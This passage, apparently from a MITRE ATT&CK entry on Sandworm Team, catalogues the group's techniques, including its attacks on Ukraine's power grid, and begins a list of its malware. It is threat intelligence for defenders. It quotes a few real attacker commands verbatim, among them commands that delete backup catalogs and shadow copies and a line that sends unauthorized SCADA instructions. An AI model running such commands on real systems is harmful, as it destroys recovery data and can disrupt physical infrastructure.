Service, Non-Application Layer Protocol, Protocol Tunneling, Scheduled Task/Job: Scheduled Task, Scripting, Server Software Component: Web Shell, System Binary Proxy Execution, Unauthorized Command Message Techniques Used Domain ID Name Use Enterprise T1087 .002 Account Discovery: Domain Account Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about usernames listed in AD.[22] .003 Account Discovery: Email Account Sandworm Team used malware to enumerate email settings, including usernames and passwords, from the M.E.Doc application.[23] Enterprise T1098 Account Manipulation During the 2016 Ukraine Electric Power Attack, Sandworm Team used the sp_addlinkedsrvlogin command in MS-SQL to create a link between a created account and other servers in the network.[18] Enterprise T1583 Acquire Infrastructure Sandworm Team used various third-party email campaign management services to deliver phishing emails.[13] .001 Domains Sandworm Team has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.[1][24] .004 Server Sandworm Team has leased servers from resellers instead of leasing infrastructure directly from hosting companies to enable its operations.[1] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Sandworm Team has scanned network infrastructure for vulnerabilities as part of its operational planning.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Sandworm Team's BCS-server tool connects to the designated C2 server via HTTP.[22] During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy to communicate between compromised hosts and their command-and-control servers via HTTP post requests. [15] Enterprise T1110 Brute Force During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts.[18] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Sandworm Team has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[1][18] During the 2016 Ukraine Electric Power Attack, Sandworm Team used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[18] During the 2022 Ukraine Electric Power Attack, Sandworm Team utilized a PowerShell utility called TANKTRAP to spread and launch a wiper using Windows Group Policy.[20] .003 Command and Scripting Interpreter: Windows Command Shell During the 2016 Ukraine Electric Power Attack, Sandworm Team used the xp_cmdshell command in MS-SQL.[18] .005 Command and Scripting Interpreter: Visual Basic Sandworm Team has created VBScripts to run an SSH server.[25][22][26][18] During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a VBA script called vba_macro.exe. This macro dropped FONTCACHE.DAT, the primary BlackEnergy implant; rundll32.exe, for executing the malware; NTUSER.log, an empty file; and desktop.ini, the default file used to determine folder displays on Windows machines. [15] During the 2016 Ukraine Electric Power Attack, Sandworm Team created VBScripts to run on an SSH server.[18] Enterprise T1586 .001 Compromise Accounts: Social Media Accounts Sandworm Team creates credential capture webpages to compromise existing, legitimate social media accounts.[24] Enterprise T1554 Compromise Host Software Binary During the 2016 Ukraine Electric Power Attack, Sandworm Team used a trojanized version of Windows Notepad to add a layer of persistence for Industroyer.[17] Enterprise T1584 .004 Compromise Infrastructure: Server Sandworm Team compromised legitimate Linux servers running the EXIM mail transfer agent for use in subsequent campaigns.[27][13] .005 Compromise Infrastructure: Botnet Sandworm Team has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.[28] Enterprise T1136 .002 Create Account: Domain Account During the 2015 Ukraine Electric Power Attack, Sandworm Team created privileged domain accounts to be used for further exploitation and lateral movement. [15] During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System). The accounts were then assigned to a domain matching local operation and were delegated new privileges.[18] Enterprise T1543 .002 Create or Modify System Process: Systemd Service During the 2022 Ukraine Electric Power Attack, Sandworm Team configured Systemd to maintain persistence of GOGETTER, specifying the WantedBy=multi-user.target configuration to run GOGETTER when the system begins accepting user logins.[20] .003 Create or Modify System Process: Windows Service During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. [29] Enterprise T1555 .003 Credentials from Password Stores: Credentials from Web Browsers Sandworm Team's CredRaptor tool can collect saved passwords from various internet browsers.[22] Enterprise T1485 Data Destruction Sandworm Team has used CaddyWiper, SDelete, and the BlackEnergy KillDisk component to overwrite files on victim systems. [30][26][20] Additionally, Sandworm Team has used the JUNKMAIL tool to overwrite files with null bytes.[14] During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed CaddyWiper on the victim\u2019s IT environment systems to wipe files related to the OT capabilities, along with mapped drives, and physical drive partitions.[20] Enterprise T1132 .001 Data Encoding: Standard Encoding Sandworm Team's BCS-server tool uses base64 encoding and HTML tags for the communication traffic between the C2 server.[22] Enterprise T1486 Data Encrypted for Impact Sandworm Team has used Prestige ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.[11] Enterprise T1213 Data from Information Repositories Sandworm Team exfiltrates data of interest from enterprise databases using Adminer.[13] Enterprise T1005 Data from Local System Sandworm Team has exfiltrated internal documents, files, and other data from compromised hosts.[1] Enterprise T1491 .002 Defacement: External Defacement Sandworm Team defaced approximately 15,000 websites belonging to Georgian government, non-government, and private sector organizations in 2019.[1][2] Enterprise T1140 Deobfuscate/Decode Files or Information Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.[22][23] Enterprise T1587 .001 Develop Capabilities: Malware Sandworm Team has developed malware for its operations, including malicious mobile applications and destructive malware such as NotPetya and Olympic Destroyer.[1] Enterprise T1561 .002 Disk Wipe: Disk Structure Wipe Sandworm Team has used the BlackEnergy KillDisk component to corrupt the infected system's master boot record.[30][26] Enterprise T1484 .001 Domain or Tenant Policy Modification: Group Policy Modification During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Group Policy Objects (GPOs) to deploy and execute malware.[20] Enterprise T1499 Endpoint Denial of Service Sandworm Team temporarily disrupted service to Georgian government, non-government, and private sector websites after compromising a Georgian web hosting provider in 2019.[1] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Sandworm Team has established social media accounts to disseminate victim internal-only documents and other sensitive data.[1] .002 Establish Accounts: Email Accounts Sandworm Team has created email accounts that mimic legitimate organizations for its spearphishing operations.[1] Enterprise T1041 Exfiltration Over C2 Channel Sandworm Team has sent system information to its C2 server using HTTP.[22] Enterprise T1190 Exploit Public-Facing Application Sandworm Team exploits public-facing applications for initial access and to acquire infrastructure, such as exploitation of the EXIM mail transfer agent in Linux systems.[27][13] Enterprise T1203 Exploitation for Client Execution Sandworm Team has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).[31][32][33] Enterprise T1133 External Remote Services Sandworm Team has used Dropbear SSH with a hardcoded backdoor password to maintain persistence within the target network. Sandworm Team has also used VPN tunnels established in legitimate software company infrastructure to gain access to internal networks of that software company's users.[25][26][34][14] During the 2015 Ukraine Electric Power Attack, Sandworm Team installed a modified Dropbear SSH client as the backdoor to target systems. [15] Enterprise T1083 File and Directory Discovery Sandworm Team has enumerated files on a compromised host.[1][18] Enterprise T1592 .002 Gather Victim Host Information: Software Sandworm Team has researched software code to enable supply-chain operations, most notably for the 2017 NotPetya attack. Sandworm Team also collected a list of computers using specific software as part of its targeting efforts.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses Sandworm Team has obtained valid emails addresses while conducting research against target organizations that were subsequently used in spearphishing campaigns.[1] .003 Gather Victim Identity Information: Employee Names Sandworm Team's research of potential victim organizations included the identification and collection of employee information.[1] Enterprise T1590 .001 Gather Victim Network Information: Domain Properties Sandworm Team conducted technical reconnaissance of the Parliament of Georgia's official internet domain prior to its 2019 attack.[1] Enterprise T1591 .002 Gather Victim Org Information: Business Relationships In preparation for its attack against the 2018 Winter Olympics, Sandworm Team conducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.[1] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry internet settings to lower internet security. [15] .002 Impair Defenses: Disable Windows Event Logging During the 2016 Ukraine Electric Power Attack, Sandworm Team disabled event logging on compromised systems.[18] Enterprise T1070 .004 Indicator Removal: File Deletion Sandworm Team has used backdoors that can delete files used in an attack from an infected system.[22][23][20] During the 2015 Ukraine Electric Power Attack, vba_macro.exe deletes itself after FONTCACHE.DAT, rundll32.exe, and the associated .lnk file is delivered. [15] Enterprise T1105 Ingress Tool Transfer Sandworm Team has pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data.[22][1] During the 2015 Ukraine Electric Power Attack, Sandworm Team pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. [15] Enterprise T1490 Inhibit System Recovery Sandworm Team uses Prestige to delete the backup catalog from the target system using: C:\\Windows\\System32\\wbadmin.exe delete catalog -quiet and to delete volume shadow copies using: C:\\Windows\\System32\\vssadmin.exe delete shadows /all /quiet. [11] Enterprise T1056 .001 Input Capture: Keylogging Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function.[22] During the 2015 Ukraine Electric Power Attack, Sandworm Team gathered account credentials via a BlackEnergy keylogger plugin. [15][35] Enterprise T1570 Lateral Tool Transfer Sandworm Team has used move to transfer files to a network share and has copied payloads--such as Prestige ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object.[18][11] Additionally, Sandworm Team has transferred an ISO file into the OT network to gain initial access.[20] During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the corporate network and between the ICS and corporate network. [15] During the 2016 Ukraine Electric Power Attack, Sandworm Team used move to transfer files to a network share.[18] During the 2022 Ukraine Electric Power Attack, Sandworm Team used a Group Policy Object (GPO) to copy CaddyWiper's executable msserver.exe from a staging server to a local hard drive before deployment.[20] Enterprise T1036 Masquerading Sandworm Team masqueraded malicious installers as Windows update packages to evade defense and entice users to execute binaries.[13] .004 Masquerade Task or Service During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.[20] .005 Match Legitimate Resource Name or Location Sandworm Team has avoided detection by naming a malicious binary explorer.exe.[22][1] During the 2016 Ukraine Electric Power Attack, DLLs and EXEs with filenames associated with common electric power sector protocols were used to masquerade files.[29] .008 Masquerade File Type During the 2016 Ukraine Electric Power Attack, Sandworm Team masqueraded executables as .txt files.[18] .010 Masquerade Account Name During the 2016 Ukraine Electric Power Attack, Sandworm Team created two new accounts, \"admin\" and \"\u0441\u0438\u0441\u0442\u0435\u043c\u0430\" (System).[18] Enterprise T1112 Modify Registry During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. [15]. Enterprise T1106 Native API Sandworm Team uses Prestige to disable and restore file system redirection by using the following functions: Wow64DisableWow64FsRedirection() and Wow64RevertWow64FsRedirection().[11] Enterprise T1040 Network Sniffing Sandworm Team has used intercepter-NG to sniff passwords in network traffic.[22] During the 2015 Ukraine Electric Power Attack, Sandworm Team used BlackEnergy\u2019s network sniffer module to discover user credentials being sent over the network between the local LAN and the power grid\u2019s industrial control systems. [36] Enterprise T1095 Non-Application Layer Protocol During the 2022 Ukraine Electric Power Attack, Sandworm Team proxied C2 communications within a TLS-based tunnel.[20] Enterprise T1571 Non-Standard Port Sandworm Team has used port 6789 to accept connections on the group's SSH server.[25] Enterprise T1027 Obfuscated Files or Information Sandworm Team has used Base64 encoding within malware variants.[31] During the 2016 Ukraine Electric Power Attack, Sandworm Team used heavily obfuscated code with Industroyer in its Windows Notepad backdoor.[17] .002 Software Packing During the 2016 Ukraine Electric Power Attack, Sandworm Team used UPX to pack a copy of Mimikatz.[18] .010 Command Obfuscation Sandworm Team has used ROT13 encoding, AES encryption and compression with the zlib library for their Python-based backdoor.[22] Enterprise T1588 .002 Obtain Capabilities: Tool Sandworm Team has acquired open-source tools for their operations, including Invoke-PSImage, which was used to establish an encrypted channel from a compromised host to Sandworm Team's C2 server in preparation for the 2018 Winter Olympics attack, as well as Impacket and RemoteExec, which were used in their 2022 Prestige operations.[1][11] Additionally, Sandworm Team has used Empire, Cobalt Strike and PoshC2.[14] .006 Obtain Capabilities: Vulnerabilities In 2017, Sandworm Team conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory.[22][26][11] During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials.[18] .003 OS Credential Dumping: NTDS Sandworm Team has used ntdsutil.exe to back up the Active Directory database, likely for credential access.[11] Enterprise T1566 .001 Phishing: Spearphishing Attachment Sandworm Team has delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails.[31][30][22][1][37][14] During the 2015 Ukraine Electric Power Attack, Sandworm Team obtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails. [35] .002 Phishing: Spearphishing Link Sandworm Team has crafted phishing emails containing malicious hyperlinks.[1] Enterprise T1598 .003 Phishing for Information: Spearphishing Link Sandworm Team has crafted spearphishing emails with hyperlinks designed to trick unwitting recipients into revealing their account credentials.[1] Enterprise T1055 Process Injection During the 2015 Ukraine Electric Power Attack, Sandworm Team loaded BlackEnergy into svchost.exe, which then launched iexplore.exe for their C2. [15] Enterprise T1572 Protocol Tunneling During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the GOGETTER tunneler software to establish a \"Yamux\" TLS-based C2 channel with an external server(s).[20] Enterprise T1090 Proxy Sandworm Team's BCS-server tool can create an internal proxy server to redirect traffic from the adversary-controlled C2 to internal servers which may not be connected to the internet, but are interconnected locally.[22] Enterprise T1219 Remote Access Tools Sandworm Team has used remote administration tools or remote industrial control system client software for execution and to maliciously release electricity breakers.[30][11] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Sandworm Team has copied payloads to the ADMIN$ share of remote systems and run net use to connect to network shares.[18][11] During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized net use to connect to network shares.[18] Enterprise T1018 Remote System Discovery Sandworm Team has used a tool to query Active Directory using LDAP, discovering information about computers listed in AD.[22][18] During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered systems over LAN connections. OT systems were visible from the IT network as well, giving adversaries the ability to discover operational assets. [36] During the 2016 Ukraine Electric Power Attack, Sandworm Team checked for connectivity to resources within the network and used LDAP to query Active Directory, discovering information about computers listed in AD.[18] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Sandworm Team leveraged SHARPIVORY, a .NET dropper that writes embedded payload to disk and uses scheduled tasks to persist on victim machines.[14] During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged Scheduled Tasks through a Group Policy Object (GPO) to execute CaddyWiper at a predetermined time.[20] Enterprise T1593 Search Open Websites/Domains Sandworm Team researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails.[1] Enterprise T1594 Search Victim-Owned Websites Sandworm Team has conducted research against potential victim websites as part of its operational planning.[1] Enterprise T1505 .001 Server Software Component: SQL Stored Procedures During the 2016 Ukraine Electric Power Attack, Sandworm Team used various MS-SQL stored procedures.[18] .003 Server Software Component: Web Shell Sandworm Team has used webshells including P.A.S. Webshell to maintain access to victim networks.[34] During the 2022 Ukraine Electric Power Attack, Sandworm Team deployed the Neo-REGEORG webshell on an internet-facing server.[20] Enterprise T1489 Service Stop Sandworm Team attempts to stop the MSSQL Windows service to ensure successful encryption of locked files.[11] Enterprise T1072 Software Deployment Tools Sandworm Team has used the commercially available tool RemoteExec for agentless remote code execution.[11] Enterprise T1608 .001 Stage Capabilities: Upload Malware Sandworm Team staged compromised versions of legitimate software installers in forums to enable initial access to executing user.[14] Enterprise T1539 Steal Web Session Cookie Sandworm Team used information stealer malware to collect browser session cookies.[13] Enterprise T1195 Supply Chain Compromise Sandworm Team staged compromised versions of legitimate software installers on forums to achieve initial, untargetetd access in victim environments.[14] .002 Compromise Software Supply Chain Sandworm Team has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.[38][26][1] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe.[23] During the 2015 Ukraine Electric Power Attack, Sandworm Team used a backdoor which could execute a supplied DLL using rundll32.exe. [15] Enterprise T1082 System Information Discovery Sandworm Team used a backdoor to enumerate information about the infected system's operating system.[23][1] Enterprise T1049 System Network Connections Discovery Sandworm Team had gathered user, IP address, and server data related to RDP sessions on a compromised host. It has also accessed network diagram files useful for understanding how a host's network was configured.[1][18] Enterprise T1033 System Owner/User Discovery Sandworm Team has collected the username from a compromised host.[1] Enterprise T1199 Trusted Relationship Sandworm Team has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.[1] Additionally, Sandworm Team has accessed Internet service providers and telecommunication entities that provide mobile connectivity.[14] Enterprise T1204 .001 User Execution: Malicious Link Sandworm Team has tricked unwitting recipients into clicking on malicious hyperlinks within emails crafted to resemble trustworthy senders.[1] .002 User Execution: Malicious File Sandworm Team has tricked unwitting recipients into clicking on spearphishing attachments and enabling malicious macros embedded within files.[22][1] During the 2015 Ukraine Electric Power Attack, Sandworm Team leveraged Microsoft Office attachments which contained malicious macros that were automatically executed once the user permitted them. [35] Enterprise T1078 Valid Accounts Sandworm Team have used previously acquired legitimate credentials prior to attacks.[30] During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts on the corporate network to escalate privileges, move laterally, and establish persistence within the corporate network. [35] .002 Domain Accounts Sandworm Team has used stolen credentials to access administrative accounts within the domain.[1][11] Enterprise T1102 .002 Web Service: Bidirectional Communication Sandworm Team has used the Telegram Bot API from Telegram Messenger to send and receive commands to its Python backdoor. Sandworm Team also used legitimate M.E.Doc software update check requests for sending and receiving commands and hosted malicious payloads on putdrive.com.[22][26] Enterprise T1047 Windows Management Instrumentation Sandworm Team has used Impacket\u2019s WMIexec module for remote code execution and VBScript to run WMI queries.[18][11] During the 2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys. [18] Mobile T1660 Phishing Sandworm Team used SMS-based phishing to target victims with malicious links.[13] Mobile T1409 Stored Application Data Sandworm Team can collect encrypted Telegram and Signal communications.[14] ICS T0895 Autorun Image During the 2022 Ukraine Electric Power Attack, Sandworm Team used existing hypervisor access to map an ISO image named a.iso to a virtual machine running a SCADA server. The SCADA server\u2019s operating system was configured to autorun CD-ROM images, and as a result, a malicious VBS script on the ISO image was automatically executed.[20] ICS T0803 Block Command Message During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked command messages by using malicious firmware to render serial-to-ethernet converters inoperable. [35] ICS T0804 Block Reporting Message During the 2015 Ukraine Electric Power Attack, Sandworm Team blocked reporting messages by using malicious firmware to render serial-to-ethernet converters inoperable. [35] ICS T0805 Block Serial COM During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet converter firmware, rendering the devices not operational. This meant that communication to the downstream serial devices was either not possible or more difficult. [15] ICS T0807 Command-Line Interface Sandworm Team uses the MS-SQL server xp_cmdshell command, and PowerShell to execute commands. [39] During the 2016 Ukraine Electric Power Attack, Sandworm Team supplied the name of the payload DLL to Industroyer via a command line parameter.[17] During the 2022 Ukraine Electric Power Attack, Sandworm Team leveraged the SCIL-API on the MicroSCADA platform to execute commands through the scilc.exe binary.[20] ICS T0885 Commonly Used Port During the 2015 Ukraine Electric Power Attack, Sandworm Team used port 443 to communicate with their C2 servers. [15] ICS T0884 Connection Proxy Sandworm Team establishes an internal proxy prior to the installation of backdoors within the network. [40] During the 2015 Ukraine Electric Power Attack, Sandworm Team established an internal proxy prior to the installation of backdoors within the network. [15] ICS T0813 Denial of Control During the 2015 Ukraine Electric Power Attack, KillDisk rendered devices that were necessary for remote recovery unusable, including at least one RTU. Additionally, Sandworm Team overwrote the firmware for serial-to-ethernet converters, denying operators control of the downstream devices. [15][35] ICS T0814 Denial of Service During the 2015 Ukraine Electric Power Attack, power company phone line operators were hit with a denial of service attack so that they couldn\u2019t field customers\u2019 calls about outages. Operators were also denied service to their downstream devices when their serial-to-ethernet converters had their firmware overwritten, which bricked the devices. [35] ICS T0816 Device Restart/Shutdown During the 2015 Ukraine Electric Power Attack, Sandworm Team scheduled the uninterruptable power supplies (UPS) to shutdown data and telephone servers via the UPS management interface. [35][15] ICS T0819 Exploit Public-Facing Application Sandworm Team actors exploited vulnerabilities in GE's Cimplicity HMI and Advantech/Broadwin WebAccess HMI software which had been directly exposed to the internet. [41] [42] ICS T0822 External Remote Services During the 2015 Ukraine Electric Power Attack, Sandworm Team used Valid Accounts taken from the Windows Domain Controller to access the control system Virtual Private Network (VPN) used by grid operators. [15] ICS T0823 Graphical User Interface During the 2015 Ukraine Electric Power Attack, Sandworm Team utilized HMI GUIs in the SCADA environment to open breakers. [35] ICS T0867 Lateral Tool Transfer During the 2015 Ukraine Electric Power Attack, Sandworm Team moved their tools laterally within the ICS network. [15] During the 2016 Ukraine Electric Power Attack, Sandworm Team used a VBS script to facilitate lateral tool transfer. The VBS script was used to copy ICS-specific payloads with the following command: cscript C:\\Backinfo\\ufn.vbs C:\\Backinfo\\101.dll C:\\Delta\\101.dll[18] ICS T0826 Loss of Availability During the 2015 Ukraine Electric Power Attack, Sandworm Team opened the breakers at the infected sites, shutting the power off for thousands of businesses and households for around 6 hours. [35][15] ICS T0827 Loss of Control During the 2015 Ukraine Electric Power Attack, operators were shut out of their equipment either through the denial of peripheral use or the degradation of equipment. Operators were therefore unable to recover from the incident through their traditional means. Much of the power was restored manually. [35] ICS T0828 Loss of Productivity and Revenue During the 2015 Ukraine Electric Power Attack, power breakers were opened which caused the operating companies to be unable to deliver power, and left thousands of businesses and households without power for around 6 hours. [35][15] ICS T0831 Manipulation of Control During the 2015 Ukraine Electric Power Attack, Sandworm Team opened live breakers via remote commands to the HMI, causing blackouts. [35] ICS T0849 Masquerading During the 2016 Ukraine Electric Power Attack, Sandworm Team transferred executable files as .txt and then renamed them to .exe, likely to avoid detection through extension tracking.[18] ICS T0886 Remote Services During the 2015 Ukraine Electric Power Attack, Sandworm Team used an IT helpdesk software to move the mouse on ICS control devices to maliciously release electricity breakers. [16] During the 2016 Ukraine Electric Power Attack, Sandworm Team used MS-SQL access to a pivot machine, allowing code execution throughout the ICS network.[18] ICS T0846 Remote System Discovery During the 2015 Ukraine Electric Power Attack, Sandworm Team remotely discovered operational assets once on the OT network. [36] [15] ICS T0853 Scripting During the 2016 Ukraine Electric Power Attack, Sandworm Team utilized VBS and batch scripts for file movement and as wrappers for PowerShell execution.[18] During the 2022 Ukraine Electric Power Attack, Sandworm Team utilizes a Visual Basic script lun.vbs to execute n.bat which then executed the MicroSCADA scilc.exe command.[20] ICS T0894 System Binary Proxy Execution During the 2022 Ukraine Electric Power Attack, Sandworm Team executed a MicroSCADA application binary scilc.exe to send a predefined list of SCADA instructions specified in a file defined by the adversary, s1.txt. The executed command C:\\sc\\prog\\exec\\scilc.exe -do pack\\scil\\s1.txt leverages the SCADA software to send unauthorized command messages to remote substations.[20] ICS T0857 System Firmware During the 2015 Ukraine Electric Power Attack, Sandworm Team overwrote the serial-to-ethernet gateways with custom firmware to make systems either disabled, shutdown, and/or unrecoverable. [35] ICS T0855 Unauthorized Command Message During the 2015 Ukraine Electric Power Attack, Sandworm Team issued unauthorized commands to substation breaks after gaining control of operator workstations and accessing a distribution management system (DMS) application. [35] During the 2022 Ukraine Electric Power Attack, Sandworm Team used the MicroSCADA SCIL-API to specify a set of SCADA instructions, including the sending of unauthorized commands to substation devices.[20] ICS T0859 Valid Accounts During the 2015 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems. Sandworm Team used the credentials of valid accounts to interact with client applications and access employee workstations hosting HMI applications. [35][15] During the 2016 Ukraine Electric Power Attack, Sandworm Team used valid accounts to laterally move through VPN connections and dual-homed systems.[18] Software ID Name References Techniques S1167 AcidPour AcidPour is associated with Sandworm Team.[43] Data Destruction, Disk Wipe: Disk Content Wipe, File and Directory Discovery, Indicator Removal: File Deletion, Peripheral Device Discovery, System Information Discovery, System Shutdown/Reboot S1125 AcidRain Sandworm Team is linked to AcidRain deployment during the ViaSat KA-SAT incident in 2022.[44][45] Data Destruction, Disk Wipe: Disk Content Wipe, File and Directory Discovery, System Shutdown/Reboot S0606 Bad Rabbit [9] Abuse Elevation Control Mechanism: Bypass User Account Control, Brute Force: Password Spraying, Data Encrypted for Impact, Drive-by Compromise, Drive-by Compromise, Exploitation of Remote Services, Exploitation of Remote Services, Firmware Corruption, Lateral Tool Transfer, Loss of Productivity and Revenue, Masquerading: Match Legitimate Resource Name or Location, Native API, Network Share Discovery, OS Credential Dumping: LSASS Memory, Process Discovery, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Rundll32, System Services: Service Execution, User Execution: Malicious File, User Execution S0089 BlackEnergy [3][10][1][2][9] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Shortcut Modification, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Destruction, Fallback Channels, File and Directory Discovery, Hijack Execution Flow: Services File Permissions Weakness, Indicator Removal, Indicator Removal: Clear Windows Event Logs, Input Capture: Keylogging, Network Service Discovery, Peripheral Device Discovery, Process Discovery, Process Injection: Dynamic-link Library Injection, Remote Services: SMB/Windows Admin Shares, Screen Capture, Spearphishing Attachment, Standard Application Layer Protocol, Subvert Trust Controls: Code Signing Policy Modification, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Unsecured Credentials: Credentials In Files, Valid Accounts, Windows Management Instrumentation S0693 CaddyWiper [20] Data Destruction, Disk Wipe: Disk Structure Wipe, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Native API, Process Discovery, System Information Discovery S0555 CHEMISTGAMES [46] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Data from Local System, Download New Code at Runtime, Encrypted Channel: Asymmetric Cryptography, Location Tracking, Masquerading: Match Legitimate Name or Location, Native API, Obfuscated Files or Information, Supply Chain Compromise: Compromise Software Supply Chain, System Information Discovery S0154 Cobalt Strike Sandworm Team has used multiple publicly available tools during operations, such as Cobalt Strike.[14] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0687 Cyclops Blink [47][48] Application Layer Protocol: Web Protocols, Boot or Logon Initialization Scripts: RC Scripts, Data Encoding: Non-Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: Timestomp, Ingress Tool Transfer, Inter-Process Communication, Masquerading: Match Legitimate Resource Name or Location, Native API, Non-Standard Port, Pre-OS Boot: Component Firmware, Process Discovery, Protocol Tunneling, Proxy: Multi-hop Proxy, System Information Discovery, System Network Configuration Discovery S0363 Empire Sandworm Team has used multiple publicly available tools during operations, such as Empire.[14] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry 